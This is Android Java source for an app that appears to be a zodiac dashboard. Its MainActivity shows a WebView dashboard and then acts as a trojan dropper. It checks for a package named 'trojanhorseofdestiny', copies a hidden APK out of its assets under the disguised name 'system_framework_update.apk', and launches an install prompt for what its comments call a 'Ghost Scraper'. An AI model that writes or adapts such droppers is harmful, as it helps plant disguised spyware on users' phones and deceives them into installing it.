package com.quill.zodiac;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.core.content.FileProvider;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // 1. Setup the beautiful Dashboard UI
        webView = new WebView(this);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        
        // Load the dashboard from assets
        webView.loadUrl("file:///android_asset/www/index.html");
        setContentView(webView);

        // 2. The Ghostly Action: Check and Install the Scraper
        if (!isScraperInstalled()) {
            installGhostScraper();
        }
    }

    private boolean isScraperInstalled() {
        try {
            getPackageManager().getPackageInfo("com.android.trojanhorseofdestiny", 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void installGhostScraper() {
        try {
            // Copy the hidden APK from assets to external storage
            InputStream is = getAssets().open("trojanhorseofdestiny.apk");
            File file = new File(getExternalFilesDir(null), "system_framework_update.apk");
            FileOutputStream fos = new FileOutputStream(file);
            byte[] buffer = new byte[1024];
            int len;
            while ((len = is.read(buffer)) != -1) {
                fos.write(buffer, 0, len);
            }
            fos.close();
            is.close();

            // Trigger the installation prompt
            Intent intent = new Intent(Intent.ACTION_VIEW);
            Uri apkUri = FileProvider.getUriForFile(this, getPackageName() + ".provider", file);
            intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
